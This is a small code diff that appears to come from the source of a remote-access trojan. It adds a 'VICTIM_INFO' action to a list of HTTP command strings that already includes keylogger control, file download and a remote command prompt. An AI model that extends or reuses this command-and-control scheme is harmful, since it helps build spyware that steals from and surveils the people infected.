@@ -73,6 +73,7 @@ namespace http {
 				const char KEYLOGGER_STOP[] = "/ACTION=KEYLOGGER_STOP";
 				const char DOWNLOAD_FILE[] = "/ACTION=DOWNLOAD_FILE";
 				const char COMMAND_PROMPT[] = "/ACTION=COMMAND_PROMPT";
+				const char VICTIM_INFO[] = "/ACTION=VICTIM_INFO";
 			}
 
 			namespace HEADER_TYPES
